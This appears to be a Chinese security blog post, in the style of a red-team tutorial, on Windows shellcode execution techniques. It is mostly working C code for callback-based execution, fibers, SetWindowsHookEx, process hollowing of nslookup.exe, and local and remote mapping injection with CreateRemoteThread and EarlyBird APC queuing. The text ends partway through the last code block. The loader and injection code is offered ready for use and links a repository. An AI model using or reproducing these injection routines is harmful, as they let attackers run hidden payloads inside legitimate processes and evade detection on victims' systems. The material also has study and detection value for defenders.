<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>在本篇文章中，我们将探讨常见的 shellcode 执行方式</p>
<p>部分在之前文章中具体分析过就不再赘述</p>
<p>所有代码 <a href="https://github.com/Arcueld/ShellcodeExec" target="_blank">https://github.com/Arcueld/ShellcodeExec</a></p>
<h1 data-content="1" id="eaf96454ac4317209b60d78b8687f0f4">常见shellcode执行方式</h1>
<p>如下是常见的shellcode执行 或内存分配方式</p>
<p>内联汇编 指针 APC注入 EarlyBird 纤程 基于资源 回调函数 进程镂空 TLS 线程劫持 SetWindowHookEx MappingInjection MappingInjection联动EarlyBird</p>
<h1 data-content="1" id="24912b1946d91ca9e78ca8adc2b75a98">回调函数</h1>
<p>基于特定的<code>WindowsAPI</code> 如 <code>EnumThreadWindows</code></p>
<p>更多的API可以在<a href="https://github.com/aahmad097/AlternativeShellcodeExec找到" target="_blank">https://github.com/aahmad097/AlternativeShellcodeExec找到</a></p>
<p>API传入的其它参数 和是否成功调用 我们都不关心 只要加载shellcode即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112104-44ce3740-c726-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="n">dwOldProtection</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">EnumThreadWindows</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">WNDENUMPROC</span><span class="p">)</span><span class="n">lpMem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></div>
<p>部分API可能需要前置条件 比如<code>SymEnumProcesses</code></p>
<p>去MSDN查文档满足条件即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112105-4505734a-c726-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112105-455c4c58-c726-1.png"/></p>
<p>注意 通过回调函数上线只能在本地进程 远程不行</p>
<h1 data-content="1" id="969b14fcdf76225d70748c1398be82f2">纤程</h1>
<p>纤程(fiber) 是用户态的线程 可以通过线程转换 所有纤程都是平等的 不存在主纤程的说法 任一纤程返回程序都将退出</p>
<p>通过<code>ConvertThreadToFiber</code>将当前线程转换为纤程</p>
<p>通过<code>CreateFiber</code>从该纤程中创建新线程 写入shellcode</p>
<p><code>SwitchToFiber</code> 执行shellcode</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112106-459046e6-c726-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="n">dwOldProtection</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>

    <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">lpFiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">lpMem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">lpFiber</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112106-45f6cb82-c726-1.png"/></p>
<h1 data-content="1" id="fdbdd92ce4bdc431ee09d9665858e05c">SetWindowHookEx</h1>
<p>这里通过<code>SetWindowHookEx</code>挂钩当前进程主线程 <code>WH_GETMESSAGE</code> 监视发布到消息队列的消息</p>
<p>后续通过<code>PeekMessage</code>从消息队列中获取消息 触发钩子的函数(shellcode)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112107-461fdba8-c726-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="n">dwOldProtection</span><span class="p">;</span>

<span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtection</span><span class="p">);</span>
<span class="n">HHOOK</span> <span class="n">hhk</span> <span class="o">=</span> <span class="n">SetWindowsHookEx</span><span class="p">(</span><span class="n">WH_GETMESSAGE</span><span class="p">,</span> <span class="p">(</span><span class="n">HOOKPROC</span><span class="p">)</span><span class="n">lpMem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">GetCurrentThreadId</span><span class="p">());</span>

<span class="n">MSG</span> <span class="n">msg</span><span class="p">;</span>

<span class="n">PostThreadMessage</span><span class="p">(</span><span class="n">GetCurrentThreadId</span><span class="p">(),</span> <span class="n">WM_USER</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">PeekMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PM_REMOVE</span><span class="p">);</span>

<span class="n">UnhookWindowsHookEx</span><span class="p">(</span><span class="n">hhk</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112107-4694391c-c726-1.png"/></p>
<h1 data-content="1" id="323f45dc8121cc473d8c5430ed6f09b9">进程镂空</h1>
<p>Process Hollowing</p>
<p>具体步骤如下</p>
<ol>
<li>通过<code>CreateProcess</code>创建主线程挂起的进程</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">)</span> <span class="p">};</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

<span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">nslookup.exe"</span><span class="p">),</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">false</span><span class="p">,</span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</pre></div>
<ol>
<li>GetThreadContext获取线程上下文 从PEB中读映像基址</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">PVOID</span> <span class="n">RemoteImageBase</span><span class="p">;</span>
<span class="n">CONTEXT</span> <span class="n">context</span><span class="p">;</span>
<span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_ALL</span><span class="p">;</span>

<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>


<span class="cp">#ifdef _WIN64</span>
    <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">context</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)),</span> <span class="o">&amp;</span><span class="n">RemoteImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="cp">#endif</span>
<span class="cp">#ifdef _X86_</span>
    <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">context</span><span class="p">.</span><span class="n">Ebx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">RemoteImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="cp">#endif</span>
</pre></div>
<ol>
<li>获取注入pe文件内容</li>
</ol>
<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">path</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">calc.exe"</span><span class="p">;</span>
<span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">dwFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
<span class="n">FileImage</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">FileImage</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FileReadSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>


<span class="n">pDosHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">FileImage</span><span class="p">;</span>  
<span class="n">pNtHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">FileImage</span> <span class="o">+</span> <span class="n">pDosHeaders</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
</pre></div>
<ol>
<li>镂空</li>
</ol>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">RemoteImageBase</span> <span class="o">==</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">NtUnmapViewOfSection</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">RemoteImageBase</span><span class="p">);</span> 
    <span class="p">}</span>
</pre></div>
<ol>
<li>分配内存 写入pe文件</li>
</ol>
<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpMem</span><span class="p">,</span> <span class="n">FileImage</span><span class="p">,</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pSectionHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">FileImage</span> <span class="o">+</span> <span class="n">pDosHeaders</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)));</span>
    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">lpMem</span> <span class="o">+</span> <span class="n">pSectionHeaders</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">FileImage</span> <span class="o">+</span> <span class="n">pSectionHeaders</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">pSectionHeaders</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">;</span>
<span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="n">lpMem</span><span class="p">,</span><span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
</pre></div>
<ol>
<li>修改目标线程入口 并恢复线程</li>
</ol>
<div class="highlight"><pre><span></span><span class="cp">#ifdef _WIN64</span>
    <span class="n">context</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">lpMem</span> <span class="o">+</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">);</span>
    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">context</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)),</span> <span class="o">&amp;</span><span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="cp">#endif</span>
<span class="cp">#ifdef _X86_</span>
    <span class="n">context</span><span class="p">.</span><span class="n">Eax</span> <span class="o">=</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)((</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">lpMem</span> <span class="o">+</span> <span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">);</span>
    <span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">context</span><span class="p">.</span><span class="n">Ebx</span> <span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)),</span> <span class="o">&amp;</span><span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="cp">#endif</span>


    <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112108-470fa0ca-c726-1.png"/></p>
<h1 data-content="1" id="20162aa6c06d6ea6baa827a328f7cb8e">映射注入</h1>
<h2 data-content="1" id="a3c17d60c5388fce2a5a54ad4536f001">本地</h2>
<p>通过<code>CreateFileMapping</code> 创建一个文件映射对象</p>
<p>通过<code>MapViewOfFile</code> 映射到内存</p>
<p>这两步类似<code>VirtualAlloc</code> 不过申请的内存类型是Mapped</p>
<p>然后执行shellcode 随便怎么执行 这里方便起见用回调</p>
<div class="highlight"><pre><span></span><span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">EnumThreadWindows</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">WNDENUMPROC</span><span class="p">)</span><span class="n">lpMem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112109-474546da-c726-1.png"/></p>
<h2 data-content="1" id="d575bf0d5bc96411443dc4b02d26b992">远程</h2>
<p>还是先创建文件映射对象 然后映射到内存 写入shellcode</p>
<p>额外的一步是通过<code>MapViewOfFile2</code> 将本地文件视图映射到远程进程</p>
<p><code>MapViewOfFile2</code> 与 <code>MapViewOfFile</code> 共享文件映射句柄 所以任何对本地映射视图中的有效载荷的任何修改都会反映在远程进程的远程映射视图中的文件中</p>
<p>注意进程句柄必须有<code>PROCESS_VM_OPERATION</code> 权限 所以这里创建完进程后通过<code>OpenProcess</code>指定<code>PROCESS_VM_OPERATION</code>再拿进程句柄 pi.hProcess不行</p>
<p>方便起见这里用<code>CreateRemoteThread</code> 如果这里用EarlyBird的话就是<code>MapViewOfFile联动EarlyBird</code></p>
<div class="highlight"><pre><span></span><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">)</span> <span class="p">};</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">_wcsdup</span><span class="p">(</span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">nslookup.exe"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_VM_OPERATION</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">MapViewOfFile2</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Remote Mapping Address : 0x%p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>


    <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112109-477fa780-c726-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241231112110-47e08f9e-c726-1.png"/></p>
<h2 data-content="1" id="6d0a17e2c2d51b47677169da1713adfe">MapViewOfFile联动EarlyBird</h2>
<p>和上面那个不同的点在于</p>
<p>创建主线程挂起的进程</p>
<p><code>CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);</code></p>
<p>插入addr到APC队列</p>
<p><code>QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);</code></p>
<p>恢复主线程 触发APC</p>
<p><code>ResumeThread(pi.hThread);</code></p>
<div class="highlight"><pre><span></span><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">)</span> <span class="p">};</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
